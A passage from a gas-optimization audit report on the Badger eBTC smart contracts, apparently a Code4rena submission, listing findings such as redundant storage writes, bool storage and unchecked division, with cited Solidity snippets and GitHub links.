[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L587](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L587)


#

```
File: contracts/CdpManagerStorage.sol

390    emit CdpUpdated(
391                    _cdpId,
392                    ISortedCdps(sortedCdps).getOwnerAddress(_cdpId),
393                    msg.sender,
394                    prevDebt,
395                    prevCollShares,
396                    _newDebt,
397                    _newColl,
398                    _cdp.stake,
399                    CdpOperation.syncAccounting
400                )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L390-L400](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L390-L400)


#

```
File: contracts/CdpManagerStorage.sol

602    emit CdpFeeSplitApplied(
603                _cdpId,
604                _oldPerUnitCdp,
605                _systemStEthFeePerUnitIndex,
606                _feeSplitDistributed,
607                _newColl
608            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L602-L608](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L602-L608)


#

```
File: contracts/CdpManagerStorage.sol

300    emit SystemSnapshotsUpdated(_totalStakesSnapshot, _totalCollateralSnapshot)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L300](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L300)


#

```
File: contracts/CdpManager.sol

466    emit Redemption(
467                _debt,
468                totals.debtToRedeem,
469                totals.collSharesDrawn,
470                totals.feeCollShares,
471                msg.sender
472            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L466-L472](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L466-L472)


#

```
File: contracts/CdpManagerStorage.sol

340    emit CdpDebtRedistributionIndexUpdated(_cdpId, _systemDebtRedistributionIndex)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L340](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L340)


#

```
File: contracts/CdpManager.sol

545    emit CdpUpdated(_cdpId, _borrower, msg.sender, _debt, _coll, 0, 0, 0, CdpOperation.closeCdp)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L545](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L545)


#

```
File: contracts/CdpManager.sol

681    emit BaseRateUpdated(decayedBaseRate)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L681](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L681)


#

```
File: contracts/CdpManager.sol

782    emit StakingRewardSplitSet(_stakingRewardSplit)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L782](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L782)


#

```
File: contracts/CdpManager.sol

801    emit RedemptionFeeFloorSet(_redemptionFeeFloor)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L801](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L801)


#

```
File: contracts/CdpManager.sol

824    emit MinuteDecayFactorSet(_minuteDecayFactor)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L824](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L824)


#

```
File: contracts/CdpManager.sol

836    emit BetaSet(_beta)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L836](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L836)


#

```
File: contracts/CdpManager.sol

848    emit RedemptionsPaused(_paused)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L848](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L848)


#

```
File: contracts/CdpManager.sol

925    emit CdpUpdated(
926                _cdpId,
927                _borrower,
928                msg.sender,
929                0,
930                0,
931                _debt,
932                _coll,
933                stake,
934                CdpOperation.openCdp
935            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L925-L935](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L925-L935)


#

```
File: contracts/CdpManager.sol

961    emit CdpUpdated(
962                _cdpId,
963                _borrower,
964                msg.sender,
965                _debt,
966                _coll,
967                _newDebt,
968                _newColl,
969                stake,
970                CdpOperation.adjustCdp
971            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L961-L971](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L961-L971)


#

```
File: contracts/CdpManagerStorage.sol

119    emit GracePeriodDurationSet(_gracePeriod)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L119](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L119)


#

```
File: contracts/CollSurplusPool.sol

83    emit SurplusCollSharesUpdated(_account, newAmount)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L83](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L83)


#

```
File: contracts/CollSurplusPool.sol

104    emit CollSharesTransferred(_account, claimableColl)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L104](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L104)


#

```
File: contracts/CollSurplusPool.sol

95    emit SurplusCollSharesUpdated(_account, 0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L95](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L95)


#

```
File: contracts/CollSurplusPool.sol

150    emit SweepTokenSuccess(token, amount, feeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L150](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L150)


#

```
File: contracts/EBTCToken.sol

267    emit Transfer(address(0), account, amount)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L267](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L267)


#

```
File: contracts/EBTCToken.sol

282    emit Transfer(account, address(0), amount)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L282](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L282)


#

```
File: contracts/EBTCToken.sol

259    emit Transfer(sender, recipient, amount)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L259](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L259)


#

```
File: contracts/EBTCToken.sol

290    emit Approval(owner, spender, amount)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L290](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L290)


#

```
File: contracts/Governor.sol

157    emit RoleNameSet(role, roleName)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L157](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L157)


#

```
File: contracts/LeverageMacroFactory.sol

56    emit DeployNewMacro(_owner, addy)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L56)


#

```
File: contracts/LiquidationLibrary.sol

238    emit CdpUpdated(
239                _liqState.cdpId,
240                _borrower,
241                msg.sender,
242                _totalDebtToBurn,
243                _totalColToSend,
244                0,
245                0,
246                0,
247                CdpOperation.liquidateInNormalMode
248            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L238-L248](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L238-L248)


#

```
File: contracts/LiquidationLibrary.sol

516    emit Liquidation(totalDebtToBurn, totalCollSharesToSend, totalLiquidatorRewardCollShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L516](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L516)


#

```
File: contracts/LiquidationLibrary.sol

490    emit CdpUpdated(
491                _cdpId,
492                sortedCdps.getOwnerAddress(_cdpId),
493                msg.sender,
494                _oldDebt,
495                _oldColl,
496                Cdps[_cdpId].debt,
497                Cdps[_cdpId].coll,
498                Cdps[_cdpId].stake,
499                CdpOperation.partiallyLiquidate
500            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L490-L500](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L490-L500)


#

```
File: contracts/LiquidationLibrary.sol

367    emit CdpLiquidated(
368                _recoveryState.cdpId,
369                _borrower,
370                _totalDebtToBurn,
371                // please note this is the collateral share of the liquidated CDP
372                _cappedColPortion,
373                CdpOperation.liquidateInRecoveryMode,
374                msg.sender,
375                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
376            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L367-L376](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L367-L376)


#

```
File: contracts/LiquidationLibrary.sol

891    emit SystemDebtRedistributionIndexUpdated(systemDebtRedistributionIndex)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L891](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L891)


#

```
File: contracts/LiquidationLibrary.sol

281    emit CdpLiquidated(
282                _liqState.cdpId,
283                _borrower,
284                _totalDebtToBurn,
285                // please note this is the collateral share of the liquidated CDP
286                _cappedColPortion,
287                CdpOperation.liquidateInNormalMode,
288                msg.sender,
289                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
290            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290)


#

```
File: contracts/LiquidationLibrary.sol

312    emit CdpUpdated(
313                _recoveryState.cdpId,
314                _borrower,
315                msg.sender,
316                _totalDebtToBurn,
317                _totalColToSend,
318                0,
319                0,
320                0,
321                CdpOperation.liquidateInRecoveryMode
322            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L312-L322](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L312-L322)


#

```
File: contracts/LiquidationLibrary.sol

437    emit CdpPartiallyLiquidated(
438                    _cdpId,
439                    sortedCdps.getOwnerAddress(_cdpId),
440                    _partialDebt,
441                    _partialColl,
442                    CdpOperation.partiallyLiquidate,
443                    msg.sender,
444                    _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
445                )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L437-L445](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L437-L445)


#

```
File: contracts/PriceFeed.sol

555    emit LastGoodPriceUpdated(_currentPrice)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L555](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L555)


#

```
File: contracts/PriceFeed.sol

67    emit FallbackCallerChanged(address(0), _fallbackCallerAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L67](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L67)


#

```
File: contracts/PriceFeed.sol

548    emit PriceFeedStatusChanged(_status)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L548](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L548)


#

```
File: contracts/PriceFeed.sol

378    emit FallbackCallerChanged(oldFallbackCaller, _fallbackCaller)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L378](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L378)


#

```
File: contracts/PriceFeed.sol

381    emit UnhealthyFallbackCaller(_fallbackCaller, block.timestamp)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L381](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L381)


#

```
File: contracts/PriceFeed.sol

387    emit FallbackCallerChanged(oldFallbackCaller, _fallbackCaller)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L387](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L387)


#

```
File: contracts/SortedCdps.sol

405    emit NodeAdded(_id, _NICR)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L405](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L405)


#

```
File: contracts/SortedCdps.sol

490    emit NodeRemoved(_id)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L490](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L490)


#

```
File: contracts/SortedCdps.sol

451    emit NodeRemoved(_ids[i])
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L451](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L451)


</details>

# 


## [G-03] Avoid unnecessary storage updates
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 4000

### Description
Avoid updating storage when the value hasn't changed. If the old value is equal to the new value, not re-storing the value will avoid a `SSTORE` operation (costing 2900 gas), potentially at the expense of a `SLOAD` operation (2100 gas) or a `WARMACCESS` operation (100 gas).

<details>

<summary>
There are 5 instances of this issue:

</summary>

###
#
The function `setBeta()` changes the state variable without first verifying if the values are different.


```
File: contracts/CdpManager.sol

835    beta = _beta
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L835](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L835)


#
The function `setFlashLoansPaused()` changes the state variable without first verifying if the values are different.


```
File: contracts/ActivePool.sol

420    flashLoansPaused = _paused
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L420](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L420)


#
The function `setFlashLoansPaused()` changes the state variable without first verifying if the values are different.


```
File: contracts/BorrowerOperations.sol

1170    flashLoansPaused = _paused
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1170](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1170)


#
The function `setRedemptionsPaused()` changes the state variable without first verifying if the values are different.


```
File: contracts/CdpManager.sol

847    redemptionsPaused = _paused
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L847](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L847)


#
The function `setRoleName()` changes the state variable without first verifying if the values are different.


```
File: contracts/Governor.sol

155    roleNames[role] = roleName
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L155](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L155)


</details>

# 


## [G-04] Multiplication and Division by 2 Should use in Bit Shifting
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 20

### Description
The expressions `x * 2` and `x / 2` can be optimized for gas efficiency by utilizing bitwise operations. In Solidity, you can achieve the same results by using bitwise left shift (x << 1) for multiplication and bitwise right shift (x >> 1) for division.

Using bitwise shift operations (SHL and SHR) instead of multiplication (MUL) and division (DIV) opcodes can lead to significant gas savings. The MUL and DIV opcodes cost 5 gas, while the SHL and SHR opcodes incur a lower cost of only 3 gas.

By leveraging these more efficient bitwise operations, you can reduce the gas consumption of your smart contracts and enhance their overall performance.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#

```
File: contracts/PriceFeed.sol

800    return
801                (_scaledDecimal *
802                    uint256(_ethBtcAnswer) *
803                    uint256(_stEthEthAnswer) *
804                    EbtcMath.DECIMAL_PRECISION) / 10 ** (_decimalDenominator * 2)
```
 instead `2` use bit shifting `1` 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L800-L804](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L800-L804)


</details>

# 


## [G-05] Using bools for storage incurs overhead
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 34200

### Description
Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.

<details>

<summary>
There are 2 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

143    bool public redemptionsPaused
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L143](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L143)


#

```
File: contracts/LeverageMacroBase.sol

35    bool internal immutable willSweep
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L35](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L35)


</details>

# 


## [G-06] Optimizing Small Data Storage with Bytes32
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 4158

### Description
This detector flags contracts that inefficiently use bytes and strings for small data that could fit into bytes32. Using bytes32 is cheaper in Solidity when the data can fit into 32 bytes.

<details>

<summary>
There are 11 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

24    string public constant NAME = "ActivePool"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L24](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L24)


#

```
File: contracts/BorrowerOperations.sol

29    string public constant NAME = "BorrowerOperations"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L29](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L29)


#

```
File: contracts/BorrowerOperations.sol

41    string internal constant _VERSION = "1"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L41](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L41)


#

```
File: contracts/CdpManagerStorage.sol

122    string public constant NAME = "CdpManager"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L122)


#

```
File: contracts/CollSurplusPool.sol

19    string public constant NAME = "CollSurplusPool"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L19](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L19)


#

```
File: contracts/EBTCToken.sol

28    string internal constant _NAME = "EBTC Stablecoin"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L28](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L28)


#

```
File: contracts/EBTCToken.sol

29    string internal constant _SYMBOL = "EBTC"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L29](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L29)


#

```
File: contracts/EBTCToken.sol

30    string internal constant _VERSION = "1"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L30](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L30)


#

```
File: contracts/HintHelpers.sol

12    string public constant NAME = "HintHelpers"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L12](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L12)


#

```
File: contracts/PriceFeed.sol

22    string public constant NAME = "PriceFeed"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L22](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L22)


#

```
File: contracts/SortedCdps.sol

52    string public constant NAME = "SortedCdps"
```
 should be convert to `bytes32`
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L52](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L52)


</details>

# 


## [G-07] Check Arguments Early
- Severity: Gas Optimization
- Confidence: High

### Description
Checks that require() or revert() statements that check input arguments are at the top of the function. Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a gas load in a function that may ultimately revert in the unhappy case.

<details>

<summary>
There are 4 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

374    require(token != address(collateral), "ActivePool: Cannot Sweep Collateral")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374)


#

```
File: contracts/ActivePool.sol

393    require(
394                _feeRecipientAddress != address(0),
395                "ActivePool: Cannot set fee recipient to zero address"
396            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396)


#

```
File: contracts/ActivePool.sol

407    require(_newFee <= MAX_FEE_BPS, "ERC3156FlashLender: _newFee should <= MAX_FEE_BPS")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L407)


#

```
File: contracts/SortedCdps.sol

508    require(_newNICR > 0, "SortedCdps: NICR must be positive")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508)


</details>

# 


## [G-08] Division operations between unsigned could be unchecked
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 255

### Description
Division operations on unsigned integers should be unchecked to save gas since they cannot overflow or underflow. Because unsigned integers cannot have negative values, execution of division operations outside `unchecked` blocks adds nothing but overhead. Saves about 85 gas.

<details>

<summary>
There are 3 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

567    uint256 _deltaFeePerUnit = _deltaFeeSplitShare / _cachedAllStakes
```
Should be unchecked - \_deltaFeeSplitShare / \_cachedAllStakes.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L567](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L567)


#

```
File: contracts/CdpManager.sol

624    uint256 newBaseRate = decayedBaseRate + (redeemedEBTCFraction / beta)
```
 Should be unchecked - redeemedEBTCFraction / beta.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L624](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L624)


#

```
File: contracts/LiquidationLibrary.sol

882    uint256 EBTCDebtRewardPerUnitStaked = EBTCDebtNumerator / \_totalStakes
```
 Should be unchecked - EBTCDebtNumerator / _totalStakes.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L882](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L882)


</details>

# 


## [G-09] Modulus operations that could be unchecked
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 85

### Description
Modulus operations should be unchecked to save gas since they cannot overflow or underflow. Execution of modulus operations outside `unchecked` blocks adds nothing but overhead. Saves about 30 gas.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#

```
File: contracts/HintHelpers.sol

184    latestRandomSeed % arrayLength
```
 should be unchecked

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L184](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L184)


</details>

# 


## [G-10] Potential Optimization by Combining Multiple Mappings into a Struct
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 1000

### Description
This detector identifies instances where multiple mappings of an address or ID could be combined into a single mapping to a struct. This optimisation not only saves a storage slot for each mapping that is combined, but also makes the contract more efficient in terms of gas usage. Depending on the circumstances and sizes of types, it can avoid a 20000 gas cost (Gsset) per combined mapping. Also, it can make reads and subsequent writes cheaper when a function requires both values and they both fit in the same storage slot. Lastly, if both fields are accessed in the same function, it can save approximately 42 gas per access due to not having to recalculate the key's keccak256 hash and its associated stack operations.

<details>

<summary>
There are 2 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

168    mapping(bytes32 => Cdp) public Cdps
```
Consider to combine with <br>-    ```Line: 190 mapping(bytes32 => uint256) public cdpDebtRedistributionIndex```<br>-    ```Line: 202 mapping(bytes32 => uint256) public cdpStEthFeePerUnitIndex```<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L168](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L168)


#

```
File: contracts/EBTCToken.sol

51    mapping(address => uint256) private _balances
```
Consider to combine with <br>-    ```Line: 52 mapping(address => mapping(address => uint256)) private _allowances```<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L51](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L51)


</details>

# 


## [G-11] Constants Variable Should Be Private for Gas Optimization
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 61200

### Description
This detector flags contracts that inefficiently use `public` for constant variables. Using `private` for constant variables is cheaper in terms of gas usage. If the value of the constant variable is needed, it can be accessed via a getter function. In case of multiple constant variables, a single getter function could be used to return a tuple of the values of all currently-private constants.

<details>

<summary>
There are 18 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

24    string public constant NAME = "ActivePool"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L24](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L24)


#

```
File: contracts/BorrowerOperations.sol

29    string public constant NAME = "BorrowerOperations"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L29](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L29)


#

```
File: contracts/CdpManagerStorage.sol

21    uint128 public constant UNSET_TIMESTAMP = type(uint128).max
```
 `UNSET_TIMESTAMP` is a public. Consider making it private to save gas.

